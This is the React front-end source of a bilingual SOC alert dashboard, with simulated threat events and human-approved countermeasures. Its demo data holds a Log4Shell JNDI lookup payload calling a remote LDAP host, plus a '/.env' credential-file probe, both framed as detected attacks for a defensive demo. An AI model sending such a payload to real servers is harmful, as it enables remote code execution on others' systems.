import React, { useState, useEffect, useRef, useCallback } from "react";
import { Header } from "./components/Header";
import { AlertList } from "./components/AlertList";
import { SelectedAlertPanel, type AuditConfirmation } from "./components/SelectedAlertPanel";
import { AuditLogDrawer } from "./components/AuditLogDrawer";
import { PitchDeckModal } from "./components/PitchDeckModal";
import { ShortcutsModal } from "./components/ShortcutsModal";
import { EventDetailDrawer } from "./components/EventDetailDrawer";
import { ConnectedDevicesModal } from "./components/ConnectedDevicesModal";
import type { SecurityEvent, Incident, ConnectedDevice } from "./types";
import { getDeviceId, getDeviceName } from "./utils/deviceInfo";
import { Shield, Lock, Cpu, BookOpen, ShieldAlert, Sparkles } from "lucide-react";

const isHttps = typeof window !== "undefined" && window.location.protocol === "https:";
const defaultHost = typeof window !== "undefined" && window.location.hostname ? window.location.hostname : "localhost";
const API_BASE = import.meta.env.VITE_API_BASE || (isHttps ? `https://${defaultHost}:8000` : `http://${defaultHost}:8000`);
const WS_URL = import.meta.env.VITE_WS_URL || (isHttps ? `wss://${defaultHost}:8000/stream` : `ws://${defaultHost}:8000/stream`);
const API_KEY = import.meta.env.VITE_PROHORI_API_KEY || "";
const jsonHeaders: Record<string, string> = API_KEY
  ? { "Content-Type": "application/json", "X-API-Key": API_KEY }
  : { "Content-Type": "application/json" };

const DEMO_EVENT_SUITE: Array<{
  source: "honeypot" | "ratelimiter" | "scanner" | "analyst";
  severity: "critical" | "high" | "medium" | "low" | "info";
  type: string;
  details: Record<string, any>;
  analyst: any;
}> = [
  // 1. Critical Severity: Remote Code Execution / JNDI Log4j Exploit
  {
    source: "honeypot",
    severity: "critical",
    type: "jndi_injection",
    details: {
      source_ip: "198.51.100.23",
      payload: "${jndi:ldap://198.51.100.23:1389/Exploit}",
      target_service: "auth-gateway",
      path: "/api/v1/auth/login",
      cve: "CVE-2021-44228"
    },
    analyst: {
      narrative_en: "Critical Remote Code Execution attempt detected matching Log4Shell (CVE-2021-44228). Adversary delivered obfuscated JNDI lookup strings to auth-gateway.",
      narrative_bn: "লগফরশেল (CVE-2021-44228) শোষণ করে রিমোট কোড এক্সিকিউশনের জরুরি আক্রমণ শনাক্ত হয়েছে। অবিলম্বে নেটওয়ার্ক ড্রপ কার্যকর করার সুপারিশ করা হচ্ছে।",
      confidence: 0.99,
      severity: "critical",
      mitre_technique: "T1190",
      citations: ["T1190", "CWE-78"],
      recommended_action: "Isolate target gateway interface and block originating IP 198.51.100.23 at border router.",
      requires_human_approval: true,
      provider: "deterministic-offline-rag"
    }
  },
  // 2. High Severity: Active Brute Force Credential Burst
  {
    source: "honeypot",
    severity: "high",
    type: "brute_force_suspected",
    details: {
      source_ip: "192.168.1.189",
      username_tried: "admin",
      password_tried: "[REDACTED_CREDENTIAL]",
      attempts_in_window: 8,
      simulated_surface: "fake_admin_login"
    },
    analyst: {
      narrative_en: "High-frequency credential stuffing detected targeting simulated administrative login surface. Adversary attempted 8 unauthorized password permutations within a 30-second window.",
      narrative_bn: "সিমুলেটেড প্রশাসনিক লগইন পৃষ্ঠ লক্ষ্য করে উচ্চ-ফ্রিকোয়েন্সি ক্রেডেনশিয়াল স্টাফিং শনাক্ত হয়েছে। আক্রমণকারী ৩০-সেকেন্ডের উইন্ডোর মধ্যে ৮টি অননুমোদিত পাসওয়ার্ড চেষ্টা করেছে।",
      confidence: 0.94,
      severity: "high",
      mitre_technique: "T1110.001",
      citations: ["T1110.001", "CWE-307"],
      recommended_action: "Block source IP at perimeter edge firewall and enforce multi-factor authentication (MFA).",
      requires_human_approval: true,
      provider: "deterministic-offline-rag"
    }
  },
  // 3. Medium Severity: API Flooding / Rate Limit Violation
  {
    source: "ratelimiter",
    severity: "medium",
    type: "rate_limit_violation",
    details: {
      source_ip: "203.0.113.42",
      path: "/api/v1/checkout",
      count: 42,
      limit: 20,
      window: "10s",
      action: "temporary_block_30s"
    },
    analyst: {
      narrative_en: "Volumetric request surge intercepted by API Abuse Guard exceeding rate threshold (42 requests / 10s). Source temporarily throttled pursuant to CWE-400.",
      narrative_bn: "এপিআই অ্যাবিউজ গার্ড নির্ধারিত সীমা অতিক্রমকারী অতিরিক্ত অনুরোধ (৪২টি / ১০ সেকেন্ড) প্রতিরোধ করেছে এবং সাময়িক ট্র্যাফিক নিয়ন্ত্রণ আরোপ করেছে।",
      confidence: 0.92,
      severity: "medium",
      mitre_technique: "T1499.002",
      citations: ["T1499.002", "CWE-400"],
      recommended_action: "Apply progressive rate-limiting and verify if client IP belongs to an automated scraper.",
      requires_human_approval: true,
      provider: "deterministic-offline-rag"
    }
  },
  // 4. Low Severity: Internal Subnet Reconnaissance & Open Port Probe
  {
    source: "scanner",
    severity: "low",
    type: "recon_probe",
    details: {
      source_ip: "10.0.0.15",
      target_port: 8080,
      protocol: "tcp",
      state: "open",
      banner: "Apache/2.4.41 (Ubuntu)",
      allowlist_verified: true
    },
    analyst: {
      narrative_en: "Internal subnet vulnerability scan detected open TCP port 8080 on authorized host 10.0.0.15. No active exploitation detected.",
      narrative_bn: "অভ্যন্তরীণ নেটওয়ার্ক স্ক্যানে অনুমোদিত হোস্ট ১০.০.০.১৫ এর পোর্ট ৮০৮০ খোলা পাওয়া গেছে। কোনো সক্রিয় শোষণের লক্ষণ নেই।",
      confidence: 0.89,
      severity: "low",
      mitre_technique: "T1595.002",
      citations: ["T1595.002", "CWE-200"],
      recommended_action: "Maintain routine firewall segmentation and review exposed service banner.",
      requires_human_approval: false,
      provider: "deterministic-offline-rag"
    }
  },
  // 5. Medium Severity: Sensitive File Reconnaissance (.env path lure)
  {
    source: "honeypot",
    severity: "medium",
    type: "recon_probe",
    details: {
      source_ip: "172.16.0.88",
      target_path: "/.env",
      method: "GET",
      user_agent: "python-requests/2.28.1",
      attempts: 1
    },
    analyst: {
      narrative_en: "Reconnaissance probe intercepted attempting to access sensitive environment file (/.env). Adversary mapping credentials.",
      narrative_bn: "সংবেদনশীল এনভায়রনমেন্ট ফাইল (/.env) অ্যাক্সেসের অনুসন্ধান ট্র্যাপে ধরা পড়েছে। আক্রমণকারী কনফিগারেশন অনুসন্ধানের চেষ্টা চালাচ্ছে।",
      confidence: 0.91,
      severity: "medium",
      mitre_technique: "T1595.002",
      citations: ["T1595.002", "CWE-200"],
      recommended_action: "Ensure zero file exposure on perimeter web servers.",
      requires_human_approval: false,
      provider: "deterministic-offline-rag"
    }
  },
  // 6. Info Severity: Routine Operational Telemetry
  {
    source: "scanner",
    severity: "info",
    type: "service_identified",
    details: {
      source_ip: "10.0.0.22",
      service: "https",
      port: 443,
      tls_version: "TLSv1.3",
      cert_valid: true
    },
    analyst: {
      narrative_en: "Routine perimeter telemetry: Verified valid TLS 1.3 configuration on perimeter gateway. System operational.",
      narrative_bn: "স্বাভাবিক সিস্টেম টেলিমেট্রি: পেরিমিটার গেটওয়েতে টিএলএস ১.৩ কনফিগারেশন যাচাইকৃত ও কার্যকর রয়েছে।",
      confidence: 0.95,
      severity: "info",
      mitre_technique: "T1046",
      citations: ["T1046"],
      recommended_action: "Continue routine passive telemetry monitoring.",
      requires_human_approval: false,
      provider: "deterministic-offline-rag"
    }
  }
];

const INITIAL_DEMO_EVENTS: SecurityEvent[] = DEMO_EVENT_SUITE.slice(0, 4).map((spec, idx) => ({
  id: `evt-init-0${idx + 1}`,
  ts: new Date(Date.now() - (3 - idx) * 60000).toISOString(),
  source: spec.source,
  severity: spec.severity,
  type: spec.type,
  details: spec.details,
  analyst: spec.analyst
}));

export const App: React.FC = () => {
  const [events, setEvents] = useState<SecurityEvent[]>(INITIAL_DEMO_EVENTS);
  const [, setIncidents] = useState<Incident[]>([]);
  const [selectedEvent, setSelectedEvent] = useState<SecurityEvent | null>(INITIAL_DEMO_EVENTS[0] || null);
  const [wsConnected, setWsConnected] = useState<boolean>(false);
  const [globalLanguage, setGlobalLanguage] = useState<"en" | "bn">("en");
  const [approvedMap, setApprovedMap] = useState<Record<string, AuditConfirmation>>({});
  const [isAuditOpen, setIsAuditOpen] = useState<boolean>(false);
  const [isPitchDeckOpen, setIsPitchDeckOpen] = useState<boolean>(false);
  const [isShortcutsOpen, setIsShortcutsOpen] = useState<boolean>(false);
  const [isRawDrawerOpen, setIsRawDrawerOpen] = useState<boolean>(false);
  const [isLocalSovereignty, setIsLocalSovereignty] = useState<boolean>(true);
  const [activeProvider, setActiveProvider] = useState<string>("deterministic-offline-rag");
  const [activeMobileTab, setActiveMobileTab] = useState<"alerts" | "analysis">("alerts");
  const [isMobile, setIsMobile] = useState<boolean>(false);
  const [connectedDevices, setConnectedDevices] = useState<ConnectedDevice[]>([]);
  const [isDevicesModalOpen, setIsDevicesModalOpen] = useState<boolean>(false);
  const [currentDeviceId] = useState<string>(() => getDeviceId());

  const wsRef = useRef<WebSocket | null>(null);
  const demoIndexRef = useRef<number>(0);

  // Responsive mobile detector
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 900);
    };
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  // 1. Fetch initial telemetry, devices, and sovereignty status
  const fetchTelemetry = useCallback(async () => {
    try {
      const [eventsRes, incRes, sovRes, devicesRes] = await Promise.all([
        fetch(`${API_BASE}/events?limit=100`),
        fetch(`${API_BASE}/analyst/incidents`),
        fetch(`${API_BASE}/sovereignty/status`).catch(() => null),
        fetch(`${API_BASE}/devices`).catch(() => null)
      ]);

      if (devicesRes && devicesRes.ok) {
        const devData = await devicesRes.json();
        if (devData.devices) {
          setConnectedDevices(devData.devices);
        }
      }

      if (eventsRes.ok) {
        const data = await eventsRes.json();
        const evList: SecurityEvent[] = data.events || [];
        setEvents(evList);
        // Default select newest event if none selected
        setSelectedEvent((prev) => {
          if (!prev && evList.length > 0) return evList[0];
          if (prev) {
            const updated = evList.find((e) => e.id === prev.id);
            return updated || prev;
          }
          return null;
        });
      }

      if (incRes.ok) {
        const incData = await incRes.json();
        setIncidents(incData.incidents || []);
      }

      if (sovRes && sovRes.ok) {
        const sovData = await sovRes.json();
        setIsLocalSovereignty(sovData.sovereignty_mode === "BANGLADESH_ON_PREM_ONLY" || sovData.sovereignty_mode === "LOCAL_SOVEREIGNTY");
        if (sovData.active_llm_backend) {
          if (sovData.active_llm_backend === "ollama") {
            setActiveProvider("ollama-local (llama3.2)");
          } else if (sovData.active_llm_backend === "offline") {
            setActiveProvider("deterministic-offline-rag");
          } else {
            setActiveProvider(sovData.active_llm_backend);
          }
        }
      }
    } catch (err) {
      console.warn("Could not fetch telemetry from API:", err);
    }
  }, []);

  // 2. Establish live WebSocket stream with automatic keepalive heartbeat & reconnection
  useEffect(() => {
    let isMounted = true;
    Promise.resolve().then(() => {
      if (isMounted) fetchTelemetry();
    });

    let retryTimeout: any;
    let pingInterval: any;

    const connectWs = () => {
      try {
        if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
          try {
            wsRef.current.close();
          } catch {}
        }

        const ws = new WebSocket(WS_URL);
        wsRef.current = ws;

        ws.onopen = () => {
          if (!isMounted) return;
          setWsConnected(true);

          // Register client device session immediately on connect
          try {
            ws.send(
              JSON.stringify({
                type: "register_device",
                device_id: currentDeviceId,
                device_name: getDeviceName(),
                user_agent: navigator.userAgent
              })
            );
          } catch {}

          // Establish periodic heartbeat every 15s to prevent NAT / proxy / browser idle socket timeouts
          clearInterval(pingInterval);
          pingInterval = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) {
              try {
                ws.send(
                  JSON.stringify({
                    type: "heartbeat",
                    device_id: currentDeviceId
                  })
                );
              } catch {}
            }
          }, 15000);
        };

        ws.onmessage = (event) => {
          // Ignore keepalive heartbeat responses from server
          if (event.data === "pong" || event.data === "ping") {
            return;
          }
          try {
            const data = JSON.parse(event.data);
            if (data.type === "connection_established") {
              if (data.devices) {
                setConnectedDevices(data.devices);
              }
            } else if (data.type === "device_list_update") {
              if (data.devices) {
                setConnectedDevices(data.devices);
              }
            } else if (data.type === "new_event" && data.event) {
              setEvents((prev) => [data.event, ...prev.filter((e) => e.id !== data.event.id)]);
              // Auto-select latest streamed event for instant feedback
              setSelectedEvent(data.event);
              fetch(`${API_BASE}/analyst/incidents`)
                .then((r) => r.json())
                .then((d) => setIncidents(d.incidents || []))
                .catch(() => {});
            } else if (data.type === "event_enriched" && data.event) {
              setEvents((prev) =>
                prev.map((e) => (e.id === data.event.id ? data.event : e))
              );
              setSelectedEvent((prev) => (prev?.id === data.event.id ? data.event : prev));
            } else if (data.type === "incident_status_changed" && data.incident_id) {
              setIncidents((prev) =>
                prev.map((i) =>
                  i.incident_id === data.incident_id ? { ...i, status: data.status } : i
                )
              );
            } else if (data.type === "demo_reset") {
              setEvents([]);
              setSelectedEvent(null);
              setIncidents([]);
            }
          } catch (e) {
            console.error("Error processing websocket message:", e);
          }
        };

        ws.onclose = () => {
          clearInterval(pingInterval);
          if (isMounted) {
            setWsConnected(false);
            clearTimeout(retryTimeout);
            retryTimeout = setTimeout(connectWs, 3000);
          }
        };

        ws.onerror = () => {
          try {
            ws.close();
          } catch {}
        };
      } catch {
        clearInterval(pingInterval);
        if (isMounted) {
          setWsConnected(false);
          clearTimeout(retryTimeout);
          retryTimeout = setTimeout(connectWs, 3000);
        }
      }
    };

    connectWs();

    const interval = setInterval(fetchTelemetry, 10000);

    return () => {
      isMounted = false;
      clearInterval(pingInterval);
      clearTimeout(retryTimeout);
      clearInterval(interval);
      if (wsRef.current) {
        try {
          wsRef.current.close();
        } catch {}
      }
    };
  }, [fetchTelemetry, currentDeviceId]);

  // 3. Trigger simulated attack telemetry (single "Run demo" action - cycles through diverse threat spectrum)
  const handleTriggerDemo = useCallback(async () => {
    const demoSpec = DEMO_EVENT_SUITE[demoIndexRef.current % DEMO_EVENT_SUITE.length];
    demoIndexRef.current += 1;

    try {
      const resp = await fetch(`${API_BASE}/events`, {
        method: "POST",
        headers: jsonHeaders,
        body: JSON.stringify({
          source: demoSpec.source,
          severity: demoSpec.severity,
          type: demoSpec.type,
          details: demoSpec.details
        })
      });

      if (resp.ok) {
        const newEv = await resp.json();
        setEvents((prev) => [newEv, ...prev.filter((e) => e.id !== newEv.id)]);
        setSelectedEvent(newEv);
        if (isMobile) {
          setActiveMobileTab("analysis");
        }
      }
    } catch (err) {
      console.warn("Backend API offline, generating client-side simulated demo event:", err);
      const simulatedDemoEv: SecurityEvent = {
        id: "evt-demo-" + Date.now(),
        ts: new Date().toISOString(),
        source: demoSpec.source,
        severity: demoSpec.severity,
        type: demoSpec.type,
        details: demoSpec.details,
        analyst: demoSpec.analyst
      };
      setEvents((prev) => [simulatedDemoEv, ...prev.filter((e) => e.id !== simulatedDemoEv.id)]);
      setSelectedEvent(simulatedDemoEv);
      if (isMobile) {
        setActiveMobileTab("analysis");
      }
    }
  }, [isMobile]);

  // 3b. Reset demo to clean slate
  const handleResetDemo = useCallback(async () => {
    try {
      await fetch(`${API_BASE}/demo/reset`, {
        method: "POST",
        headers: jsonHeaders
      });
      setEvents([]);
      setSelectedEvent(null);
      setIncidents([]);
    } catch (err) {
      console.error("Failed to reset demo:", err);
    }
  }, []);

  // 4. Toggle Data Sovereignty Mode
  const handleToggleSovereignty = async () => {
    const nextMode = isLocalSovereignty ? "cloud" : "local";
    try {
      const resp = await fetch(`${API_BASE}/sovereignty/toggle`, {
        method: "POST",
        headers: jsonHeaders,
        body: JSON.stringify({ mode: nextMode })
      });
      if (resp.ok) {
        setIsLocalSovereignty(!isLocalSovereignty);
        setActiveProvider(nextMode === "local" ? "ollama-local (llama3.2)" : "cloud-hybrid");
      }
    } catch (e) {
      console.error("Failed to toggle sovereignty:", e);
    }
  };

  // 5. Retriage Event
  const handleRetriage = async (eventId: string) => {
    try {
      const resp = await fetch(`${API_BASE}/analyst/triage/${eventId}`, {
        method: "POST"
      });
      if (resp.ok) {
        const updated = await resp.json();
        setEvents((prev) => prev.map((e) => (e.id === updated.id ? updated : e)));
        setSelectedEvent(updated);
      }
    } catch (err) {
      console.error("Retriage request failed:", err);
    }
  };

  // 6. Human-in-the-Loop Countermeasure Approval
  const handleApproveDefense = async (
    actionId: string,
    target: string,
    actionType: string
  ): Promise<AuditConfirmation | void> => {
    try {
      const resp = await fetch(`${API_BASE}/audit/approve`, {
        method: "POST",
        headers: jsonHeaders,
        body: JSON.stringify({
          action_id: actionId,
          target: target,
          action_type: actionType,
          operator_id: "SOC_CONSOLE_OPERATOR"
        })
      });

      if (resp.ok) {
        const data: AuditConfirmation = await resp.json();
        const actionKey = selectedEvent ? `${selectedEvent.id}_${target}` : actionId;
        setApprovedMap((prev) => ({
          ...prev,
          [actionKey]: data,
          [actionId]: data
        }));
        // Refresh incidents
        fetchTelemetry();
        return data;
      }
    } catch (err) {
      console.warn("Backend API offline, applying client-side simulated countermeasure approval:", err);
      const simulatedApproval: AuditConfirmation = {
        audit_id: "audit-sim-" + Date.now(),
        action_id: actionId,
        target: target,
        timestamp: new Date().toISOString(),
        enforcement: "PERIMETER_FIREWALL_BLOCK",
        status: "APPROVED"
      };
      const actionKey = selectedEvent ? `${selectedEvent.id}_${target}` : actionId;
      setApprovedMap((prev) => ({
        ...prev,
        [actionKey]: simulatedApproval,
        [actionId]: simulatedApproval
      }));
      return simulatedApproval;
    }
  };

  // 7. Global Accessible Keyboard Shortcuts
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.target instanceof HTMLInputElement || e.target instanceof HTMLTextAreaElement) {
        return;
      }
      if (e.key === "Escape") {
        setIsAuditOpen(false);
        setIsPitchDeckOpen(false);
        setIsShortcutsOpen(false);
        setIsRawDrawerOpen(false);
        setIsDevicesModalOpen(false);
      } else if (e.key === "?" || (e.shiftKey && e.key === "/")) {
        e.preventDefault();
        setIsShortcutsOpen((prev) => !prev);
      } else if (e.shiftKey && (e.key === "D" || e.key === "S")) {
        e.preventDefault();
        handleTriggerDemo();
      } else if (e.shiftKey && e.key === "A") {
        e.preventDefault();
        setIsAuditOpen((prev) => !prev);
      } else if (e.shiftKey && e.key === "P") {
        e.preventDefault();
        setIsPitchDeckOpen((prev) => !prev);
      } else if (e.shiftKey && e.key === "W") {
        e.preventDefault();
        setIsDevicesModalOpen((prev) => !prev);
      } else if (e.shiftKey && e.key === "L") {
        e.preventDefault();
        setGlobalLanguage((prev) => (prev === "en" ? "bn" : "en"));
      } else if (e.shiftKey && e.key === "R") {
        e.preventDefault();
        handleResetDemo();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [handleTriggerDemo, handleResetDemo]);

  const isBn = globalLanguage === "bn";

  return (
    <div className="soc-container">
      {/* 1. Top Simplified Header */}
      <Header
        wsConnected={wsConnected}
        globalLanguage={globalLanguage}
        setGlobalLanguage={setGlobalLanguage}
        onTriggerDemo={handleTriggerDemo}
        onResetDemo={handleResetDemo}
        onOpenAudit={() => setIsAuditOpen(true)}
        onOpenPitchDeck={() => setIsPitchDeckOpen(true)}
        isLocalSovereignty={isLocalSovereignty}
        onToggleSovereignty={handleToggleSovereignty}
        onOpenShortcuts={() => setIsShortcutsOpen(true)}
        activeProvider={activeProvider}
        apiBase={API_BASE}
        connectedDevicesCount={connectedDevices.filter((d) => d.status === "online").length || 1}
        onOpenConnectedDevices={() => setIsDevicesModalOpen(true)}
      />

      {/* 2. Mobile Tab Switcher (< 900px) */}
      <div className="mobile-tab-bar" role="tablist" aria-label="Mobile View Switcher">
        <button
          role="tab"
          aria-selected={activeMobileTab === "alerts"}
          onClick={() => setActiveMobileTab("alerts")}
          className={`mobile-tab-btn ${activeMobileTab === "alerts" ? "active" : ""}`}
        >
          <ShieldAlert size={16} />
          <span>{isBn ? `সরাসরি সতর্কতা (${events.length})` : `Live Alerts (${events.length})`}</span>
        </button>
        <button
          role="tab"
          aria-selected={activeMobileTab === "analysis"}
          onClick={() => setActiveMobileTab("analysis")}
          className={`mobile-tab-btn ${activeMobileTab === "analysis" ? "active" : ""}`}
        >
          <Sparkles size={16} />
          <span>{isBn ? "এআই হুমকি বিশ্লেষণ" : "Threat Analysis"}</span>
        </button>
      </div>

      {/* 3. Main Simplified 2-Column SOC Layout */}
      <main className="simplified-grid" role="main">
        {/* Left Column: Live Alert Feed */}
        <div style={{ display: isMobile && activeMobileTab !== "alerts" ? "none" : "block" }}>
          <AlertList
            events={events}
            selectedEventId={selectedEvent?.id || null}
            onSelectEvent={(ev) => {
              setSelectedEvent(ev);
              if (isMobile) {
                setActiveMobileTab("analysis");
              }
            }}
            globalLanguage={globalLanguage}
            onTriggerDemo={handleTriggerDemo}
          />
        </div>

        {/* Right Column: Selected Alert Intelligence & Action Gate */}
        <div style={{ display: isMobile && activeMobileTab !== "analysis" ? "none" : "block" }}>
          <SelectedAlertPanel
            event={selectedEvent}
            globalLanguage={globalLanguage}
            apiBase={API_BASE}
            onApproveDefense={handleApproveDefense}
            onRetriage={handleRetriage}
            approvedMap={approvedMap}
          />
        </div>
      </main>

      {/* 4. Footer */}
      <footer
        style={{
          marginTop: "28px",
          padding: "16px 22px",
          background: "var(--navy)",
          border: "1px solid var(--cream-alpha-20)",
          borderRadius: "10px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          flexWrap: "wrap",
          gap: "12px",
          fontSize: "14px",
          color: "var(--cream-alpha-75)"
        }}
        role="contentinfo"
      >
        <div style={{ display: "flex", alignItems: "center", gap: "14px", flexWrap: "wrap" }}>
          <span style={{ display: "flex", alignItems: "center", gap: "6px", color: "var(--cream)", fontWeight: 600 }}>
            <Shield size={16} color="var(--cream)" />
            <span>Prohori Sentinel &bull; International AI Builders Congress 2026</span>
          </span>
          <span
            className="badge"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "4px",
              background: "var(--cream-alpha-10)",
              color: "var(--cream)",
              border: "1px solid var(--cream-alpha-20)",
              padding: "4px 10px",
              borderRadius: "6px",
              fontSize: "12px",
              fontWeight: 600
            }}
          >
            <Lock size={12} />
            <span>Controls: Zero packet egress in sovereignty mode</span>
          </span>
          <span
            className="badge"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "4px",
              background: "var(--cream-alpha-10)",
              color: "var(--cream)",
              border: "1px solid var(--cream-alpha-20)",
              padding: "4px 10px",
              borderRadius: "6px",
              fontSize: "12px",
              fontWeight: 600
            }}
          >
            <Cpu size={12} />
            <span>Sovereign Engine: Llama 3.2 / Air-Gapped RAG (Online)</span>
          </span>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: "14px", flexWrap: "wrap" }}>
          <a
            href={`${API_BASE}/docs`}
            target="_blank"
            rel="noopener noreferrer"
            style={{ color: "var(--coral)", textDecoration: "none", display: "flex", alignItems: "center", gap: "6px", fontWeight: 700 }}
          >
            <BookOpen size={14} />
            <span>Interactive API Docs</span>
          </a>
          <button
            onClick={() => setIsRawDrawerOpen(true)}
            style={{
              background: "transparent",
              border: "none",
              color: "var(--cream)",
              cursor: "pointer",
              fontSize: "14px",
              textDecoration: "underline"
            }}
          >
            {isBn ? "কাঁচা ফরেনসিক তথ্য" : "Raw Forensic Event"}
          </button>
          <span className="font-mono" style={{ color: "var(--cream-alpha-65)", fontSize: "12px" }}>
            [? : Shortcuts | Shift+D: Demo | Shift+A: Audit | Shift+P: Pitch Deck | Shift+W: Devices | Shift+R: Reset]
          </span>
        </div>
      </footer>

      {/* 5. Modals & Drawers */}
      <AuditLogDrawer
        isOpen={isAuditOpen}
        onClose={() => setIsAuditOpen(false)}
        apiBase={API_BASE}
      />

      <PitchDeckModal
        isOpen={isPitchDeckOpen}
        onClose={() => setIsPitchDeckOpen(false)}
        globalLanguage={globalLanguage}
      />

      <ShortcutsModal
        isOpen={isShortcutsOpen}
        onClose={() => setIsShortcutsOpen(false)}
        globalLanguage={globalLanguage}
      />

      <ConnectedDevicesModal
        isOpen={isDevicesModalOpen}
        onClose={() => setIsDevicesModalOpen(false)}
        devices={connectedDevices}
        currentDeviceId={currentDeviceId}
        globalLanguage={globalLanguage}
        onRefresh={() => {
          fetch(`${API_BASE}/devices`)
            .then((r) => (r.ok ? r.json() : null))
            .then((d) => d?.devices && setConnectedDevices(d.devices))
            .catch(() => {});
        }}
      />

      {isRawDrawerOpen && (
        <EventDetailDrawer
          event={selectedEvent}
          onClose={() => setIsRawDrawerOpen(false)}
          onRetriage={handleRetriage}
          globalLanguage={globalLanguage}
          apiBase={API_BASE}
        />
      )}
    </div>
  );
};

export default App;
